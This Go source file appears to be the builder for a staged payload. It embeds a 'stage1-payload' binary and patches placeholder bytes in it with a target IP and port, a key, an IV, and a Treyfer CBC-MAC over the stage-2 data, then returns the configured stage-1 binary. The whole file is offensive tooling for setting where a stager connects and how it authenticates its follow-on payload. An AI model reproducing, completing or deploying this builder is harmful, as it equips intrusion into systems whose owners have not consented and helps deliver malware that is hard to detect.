package patching

import (
	"bytes"
	_ "embed"
	"net"
)

//go:embed dist/stage1-payload.bin
var stage1Data []byte

var STAGE_1_PATCH_SOCKADDR = []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06}
var STAGE_1_PATCH_IV = []byte{0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42}
var STAGE_1_PATCH_KEY = []byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41}
var STAGE_1_PATCH_MAC = []byte{0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43}

func validatePatchIndex() {
	if bytes.Index(stage1Data, STAGE_1_PATCH_SOCKADDR) < 256 {
		panic("error: sockaddr occurred within first 256 bytes of Stage 1. This means dynamic data will be used in the SBox")
	}
	if bytes.Index(stage1Data, STAGE_1_PATCH_MAC) < 256 {
		panic("error: cbc mac occurred within first 256 bytes of Stage 1. This means dynamic data will be used in the SBox")
	}
}

func PatchStage1(target net.IP, port uint16, stage2Data []byte, secretKey []byte) ([]byte, error) {
	sockAddr := packAddress(target, port)

	key := secretKey[:8]
	iv := secretKey[8:]

	patchedSockAddr := PatchBinary(stage1Data, STAGE_1_PATCH_SOCKADDR, sockAddr)
	patchedIV := PatchBinary(patchedSockAddr, STAGE_1_PATCH_IV, iv)
	patchedKey := PatchBinary(patchedIV, STAGE_1_PATCH_KEY, key)

	mac, err := TreyferCBCMac(stage2Data, key, iv)
	if err != nil {
		return nil, err
	}

	patchedMac := PatchBinary(patchedKey, STAGE_1_PATCH_MAC, mac)

	return patchedMac, nil
}

func retrieveSBox() []byte {
	validatePatchIndex()

	return stage1Data[:256]
}
